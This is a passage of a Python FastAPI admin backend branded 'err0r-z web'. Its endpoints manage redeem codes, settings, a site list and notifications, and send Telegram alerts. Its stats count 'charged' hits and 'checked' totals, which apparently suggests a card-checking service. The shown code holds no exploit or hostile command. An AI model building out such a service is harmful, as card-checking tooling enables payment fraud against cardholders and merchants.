async def admin_del_code(code: str, user=Depends(_admin)):
    ex("DELETE FROM redeem_codes WHERE code=?", (code,))
    return {"ok": True}

@app.get("/api/admin/settings")
async def admin_settings(user=Depends(_admin)):
    return _settings_all()

@app.post("/api/admin/settings")
async def admin_set_setting(body: SettingIn, user=Depends(_admin)):
    _set_setting(body.key, body.value)
    return {"ok": True}

@app.post("/api/admin/bot/test")
async def admin_bot_test(user=Depends(_admin)):
    await tg_send("<b>✅ err0r-z web</b>\nTest message from admin panel.")
    return {"ok": True}

@app.get("/api/admin/sites")
async def admin_sites(user=Depends(_admin)):
    return [dict(r) for r in q("SELECT * FROM sites ORDER BY id")]

@app.post("/api/admin/sites")
async def admin_add_site(body: dict, user=Depends(_admin)):
    url = (body.get("url") or "").strip().lower()
    url = url.split("://", 1)[-1].split("/")[0]
    if not url:
        raise HTTPException(400, "empty")
    ex("INSERT OR IGNORE INTO sites(url) VALUES (?)", (url,))
    return {"ok": True}

@app.delete("/api/admin/sites/{sid}")
async def admin_del_site(sid: int, user=Depends(_admin)):
    ex("DELETE FROM sites WHERE id=?", (sid,))
    return {"ok": True}

@app.post("/api/admin/notify")
async def admin_notify(body: NotifyIn, user=Depends(_admin)):
    ex("INSERT INTO notifications(user_id, text, ts) VALUES (?,?,?)", (body.user_id, body.text, _now()))
    return {"ok": True}

@app.get("/api/admin/stats")
async def admin_stats(user=Depends(_admin)):
    return {
        "users": q1("SELECT COUNT(*) as n FROM users")["n"],
        "jobs": q1("SELECT COUNT(*) as n FROM jobs")["n"],
        "hits": q1("SELECT COUNT(*) as n FROM charged")["n"],
        "apis": q1("SELECT COUNT(*) as n FROM apis")["n"],
        "checked": q1("SELECT COALESCE(SUM(total),0) as n FROM jobs")["n"],
    }